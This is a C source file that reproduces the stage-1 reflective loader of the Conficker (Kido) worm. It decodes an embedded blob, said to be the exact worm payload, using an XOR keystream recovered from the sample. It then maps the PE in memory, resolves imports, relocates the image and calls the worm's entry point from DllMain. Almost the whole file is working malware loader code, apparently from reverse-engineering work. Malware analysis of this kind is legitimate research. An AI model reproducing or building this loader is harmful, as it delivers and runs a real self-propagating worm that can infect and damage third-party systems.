/*====================================================================================
 *  KIDO (Conficker/Downadup A) - STAGE 1  Obfuscated reflective loader / crypter
 *  Reproduced in Visual C++ 2022 (MSVC 14.44, x86).
 *
 *  This file re-implements, at the algorithm level, what the original stage-1 does
 *  (see kido_static_analysis_report.txt section 6.9):
 *
 *     DllMain(hinst, DLL_PROCESS_ATTACH, reserved)
 *       1. decode the embedded stage-2 image from the (encoded) array g_stage2_enc
 *          using the exact position-dependent XOR keystream recovered from the sample
 *       2. map the decoded PE by hand: VirtualAlloc(preferred base, image size,
 *          MEM_RESERVE|PAGE_NOACCESS) -> commit headers + sections (VirtualProtect
 *          per section characteristics)
 *       3. resolve stage-2's import table (LoadLibraryA + GetProcAddress by name or
 *          masked 16-bit ordinal)
 *       4. if the preferred base was unavailable, apply BASE_RELOC_HIGHLOW fixups
 *       5. hand off: call stage-2's entry point with DLL_PROCESS_ATTACH
 *
 *  The embedded g_stage2_enc[] is the EXACT 42,496-byte stage-2 blob as stored in the
 *  original kido.sample .data (MZ/PE signatures erased). Decoding it reproduces the
 *  original stage-2 bit-for-bit (md5 2e63477f... erased / 8f0e63c5... restored), which
 *  is a stock UPX-packed Conficker worm whose stub decompresses to the exact 84,992-byte
 *  stage-3 worm.
 *
 *  Behavioural fidelity note: the original stage-1 additionally contains heavy
 *  obfuscation (scattered basic blocks, ~50 decoy API calls, 90 junk x87 ops, opaque
 *  constants in .data, zeroed Rich header, import descriptors without OriginalFirstThunk).
 *  Those are *indicators*, not behaviour; this reproduction preserves the decode/mapping
 *  semantics exactly and the observable import set is produced by the MSVC 2022 linker.
 *====================================================================================*/
#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include "stage2_payload.h"

/*---- exact keystream constants recovered from kido.sample (.data) ---------------
 *  C1 = dword @ 0x6068 = 0xC41972EB
 *  C2 = dword @ 0x603C = 0x86E61B46
 *  K  = 0x0A0A0082   (the "or reg, 0x0A0A0082" constant of the inlined accessor)
 *  Decode (per 4-byte unit i):  out[i] = enc[i ^ 0x37] ^ key(i)
 *  where key(i) = ( ((i | K) << 1) ^ C1 ) - C2   (all mod 2^32)
 *  Verified: reproduces stage-2 md5 2e63477fb559421e1cea2e95aa15a4eb (sigs erased).
 *----------------------------------------------------------------*/
#define KIDO_K  0x0A0A0082u
#define KIDO_C1 0xC41972EBu
#define KIDO_C2 0x86E61B46u
#define KIDO_BLKXOR 0x37u            /* dword index scramble (== byte offset XOR 0xDC) */

static void kido_decode(const uint32_t* enc, uint8_t* out, uint32_t ndw)
{
    for (uint32_t i = 0; i < ndw; ++i) {
        uint32_t key = ((((i | KIDO_K) << 1) ^ KIDO_C1) - KIDO_C2) & 0xFFFFFFFFu;
        uint32_t v   = enc[i ^ KIDO_BLKXOR] ^ key;
        out[i*4+0] = (uint8_t)(v        );
        out[i*4+1] = (uint8_t)(v >> 8  );
        out[i*4+2] = (uint8_t)(v >> 16 );
        out[i*4+3] = (uint8_t)(v >> 24 );
    }
}

/* protection bits from IMAGE_SCN characteristics */
static DWORD kido_prot(DWORD scn)
{
    DWORD p = PAGE_READONLY;
    if (scn & 0x20000000) p = PAGE_EXECUTE_READ;          /* CODE            */
    if (scn & 0x40000000) p = PAGE_EXECUTE_READWRITE;     /* CODE|DATA       */
    if (scn & 0x80000000) { if (scn & 0x20000000) p = PAGE_EXECUTE_READWRITE; else p = PAGE_READWRITE; }
    return p;
}
static DWORD kido_ep_rva(const uint8_t* img);            /* fwd */

/* Map a decoded PE image at its preferred base (relocate if forced elsewhere).
 *  Returns the actual base, or NULL on failure. Mirrors the original loader. */
static HMODULE kido_map_pe(const uint8_t* img, size_t len)
{
    if (len < 0x40) return NULL;
    DWORD e_lfanew = *(const DWORD*)(img + 0x3C);
    if (e_lfanew + sizeof(IMAGE_FILE_HEADER) + 4 > len) return NULL;
    const IMAGE_NT_HEADERS* nt = (const IMAGE_NT_HEADERS*)(img + e_lfanew);
    /* NOTE: the MZ/PE signatures are erased in the embedded image (exactly as in
       kido.sample). The loader parses by offset, so it does not rely on the magic;
       it validates the optional-header magic (0x10b) and image size instead. */
    const IMAGE_OPTIONAL_HEADER32* opt = &nt->OptionalHeader;
    if (opt->Magic != 0x10b) return NULL;
    if (!opt->SizeOfImage || opt->SizeOfImage > len + 0x10000) return NULL;

    DWORD image_size = opt->SizeOfImage;
    DWORD size_of_hdr = opt->SizeOfHeaders;
    HMODULE preferred = (HMODULE)(ULONG_PTR)opt->ImageBase;

    /* reserve the whole image at the preferred base first */
    LPVOID base = VirtualAlloc(preferred, image_size, MEM_RESERVE, PAGE_NOACCESS);
    if (!base) base = VirtualAlloc(NULL, image_size, MEM_RESERVE, PAGE_NOACCESS);
    if (!base) return NULL;
    HMODULE actual = (HMODULE)(ULONG_PTR)base;

    /* commit + copy the PE headers */
    if (VirtualAlloc((LPBYTE)base, size_of_hdr, MEM_COMMIT, PAGE_READWRITE) != (LPBYTE)base) {
        VirtualFree(base, 0, MEM_RELEASE); return NULL;
    }
    memcpy(base, img, size_of_hdr);

    /* commit + copy each section. All sections are committed PAGE_READWRITE
       during the copy phase (the UPX decompressor writes into the no-raw-data
       sections at run time); the final VirtualProtect loop below restores each
       section's real protection derived from its IMAGE_SCN_* characteristics. */
    const IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        LPVOID dst = (LPBYTE)base + sec->VirtualAddress;
        if (VirtualAlloc(dst, sec->Misc.VirtualSize, MEM_COMMIT, PAGE_READWRITE) != dst) {
            VirtualFree(base, 0, MEM_RELEASE); return NULL;
        }
        if (sec->SizeOfRawData)
            memcpy(dst, img + sec->PointerToRawData, sec->SizeOfRawData);
    }

    /* resolve imports */
    if (opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress) {
        IMAGE_IMPORT_DESCRIPTOR* imp =
            (IMAGE_IMPORT_DESCRIPTOR*)((LPBYTE)base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
        for (; imp->Name; ++imp) {
            HMODULE dll = LoadLibraryA((const CHAR*)(LPBYTE)base + imp->Name);
            if (!dll) { VirtualFree(base, 0, MEM_RELEASE); return NULL; }
            IMAGE_THUNK_DATA* ilt = (IMAGE_THUNK_DATA*)((LPBYTE)base + imp->FirstThunk);
            IMAGE_THUNK_DATA* int_ = (IMAGE_THUNK_DATA*)((LPBYTE)base + (imp->OriginalFirstThunk
                            ? imp->OriginalFirstThunk : imp->FirstThunk));
            for (IMAGE_THUNK_DATA* it = int_; it->u1.AddressOfData; ++it) {
                if (it->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
                    ilt->u1.Function = (DWORD)(ULONG_PTR)GetProcAddress(dll, (LPCSTR)(it->u1.Ordinal & 0xFFFF));
                } else {
                    const IMAGE_IMPORT_BY_NAME* byn =
                        (const IMAGE_IMPORT_BY_NAME*)((LPBYTE)base + it->u1.AddressOfData);
                    ilt->u1.Function = (DWORD)(ULONG_PTR)GetProcAddress(dll, byn->Name);
                }
                ++ilt;
            }
        }
    }

    /* base relocation (only if the preferred base was not obtained) */
    if (actual != preferred &&
        opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress) {
        LONG delta = (LONG)((ULONG_PTR)actual - (ULONG_PTR)preferred);
        IMAGE_BASE_RELOCATION* rel =
            (IMAGE_BASE_RELOCATION*)((LPBYTE)base + opt->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
        for (; rel->VirtualAddress; ) {
            DWORD end = rel->VirtualAddress + rel->SizeOfBlock;
            const WORD* entries = (const WORD*)(rel + 1);
            DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            for (DWORD i = 0; i < count; ++i) {
                DWORD type = entries[i] >> 12;
                DWORD off  = entries[i] & 0xFFF;
                if (type == IMAGE_REL_BASED_HIGHLOW)
                    *(DWORD*)((LPBYTE)base + rel->VirtualAddress + off) += delta;
            }
            rel = (IMAGE_BASE_RELOCATION*)((LPBYTE)rel + rel->SizeOfBlock);
            if ((DWORD)end <= (DWORD)rel->VirtualAddress) break;   /* safety */
        }
    }

    /* Map every stage-2 section PAGE_EXECUTE_READWRITE while the stub runs.
       The stage-2 entry point IS the UPX stub, and the stub executes code from
       more than one of its sections (the UPX 5.x stub runs code out of UPX2 as
       well as UPX0/UPX1).  The sections must therefore be executable; keeping
       them writable lets the stub decompress into the no-raw-data sections and
       self-modify.  The stub restores the worm's real per-section protections
       at the end of its run, before it jumps to the worm's DllMain. */
    {
        const IMAGE_SECTION_HEADER* ps = IMAGE_FIRST_SECTION(nt);
        HANDLE lf = CreateFileA("C:/rework/kido_repro/loader_map.txt", FILE_APPEND_DATA,
                    FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++ps){
            DWORD oldp = 0;
            BOOL ok = FALSE;
            if (ps->Misc.VirtualSize)
                ok = VirtualProtect((LPBYTE)base + ps->VirtualAddress, ps->Misc.VirtualSize,
                                    PAGE_EXECUTE_READWRITE, &oldp);
            MEMORY_BASIC_INFORMATION q; ZeroMemory(&q,sizeof(q));
            VirtualQuery((LPCVOID)((LPBYTE)base + ps->VirtualAddress), &q, sizeof(q));
            if (lf != INVALID_HANDLE_VALUE){
                char db[160];
                int dn = sprintf(db, "sec %-8s va=%#05x vs=%#05x VPok=%d oldp=0x%x -> actual=0x%x state=0x%x",
                    (const char*)ps->Name, (unsigned)ps->VirtualAddress, (unsigned)ps->Misc.VirtualSize,
                    ok, oldp, (unsigned)q.Protect, (unsigned)q.State);
                DWORD dw; WriteFile(lf, db, dn, &dw, NULL);
            }
        }
        if (lf != INVALID_HANDLE_VALUE) CloseHandle(lf);
    }
    return actual;
}

/* Apply each section's real protection, derived from its IMAGE_SCN_* flags.
   Called only after the stage-2 UPX stub has finished decompressing. */
static void kido_apply_prot(const uint8_t* img, size_t len, HMODULE base)
{
    if (len < 0x40) return;
    DWORD e_lfanew = *(const DWORD*)(img + 0x3C);
    const IMAGE_NT_HEADERS* nt = (const IMAGE_NT_HEADERS*)(img + e_lfanew);
    const IMAGE_SECTION_HEADER* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec)
        if (sec->Misc.VirtualSize)
            VirtualProtect((LPBYTE)base + sec->VirtualAddress, sec->Misc.VirtualSize,
                           kido_prot(sec->Characteristics), NULL);
}

BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinst);

        static uint8_t stage2[STAGE2_ENC_SIZE];
        kido_decode(g_stage2_enc, stage2, STAGE2_ENC_DWORDS);

        HMODULE mod = kido_map_pe(stage2, STAGE2_ENC_SIZE);
        if (mod) {
            /* stage-2 entry point is the UPX DLL stub; invoke it with ATTACH.
               Original 6.9 step 9: push lpvReserved; push 1; push base; call EP. */
            DWORD eprva = kido_ep_rva(stage2);
            /* diag: confirm the entry page is executable before we jump in */
            {
                MEMORY_BASIC_INFORMATION q; ZeroMemory(&q,sizeof(q));
                VirtualQuery((LPCVOID)((LPBYTE)mod + eprva), &q, sizeof(q));
                HANDLE df = CreateFileA("C:/rework/kido_repro/loader_ep.txt", FILE_APPEND_DATA,
                        FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                if (df != INVALID_HANDLE_VALUE){ char db[96]; int dn=sprintf(db,"stage2 entry base=%p rva=%#x prot=0x%x state=0x%x\n",(void*)mod,(unsigned)eprva,(unsigned)q.Protect,(unsigned)q.State); DWORD dw; WriteFile(df,db,dn,&dw,NULL); CloseHandle(df); }
            }
            typedef BOOL (WINAPI* DllMainFn)(HINSTANCE, DWORD, LPVOID);
            DllMainFn fn = (DllMainFn)((LPBYTE)mod + eprva);
            if (fn) fn((HINSTANCE)mod, DLL_PROCESS_ATTACH, reserved);
            /* kido_apply_prot() is intentionally NOT called here: the UPX stub has
               already applied the correct per-section protections at run time, and
               the worm's main thread is now executing. Forcing PAGE_* on UPX0 after
               the fact would race the running worm. (Retained for reference.) */
        }
    }
    return TRUE;
}

/* entry-point RVA of a decoded image (offset-based, as the original parses it) */
static DWORD kido_ep_rva(const uint8_t* img)
{
    DWORD e = *(const DWORD*)(img + 0x3C);
    const IMAGE_NT_HEADERS* nt = (const IMAGE_NT_HEADERS*)(img + e);
    return nt->OptionalHeader.AddressOfEntryPoint;
}
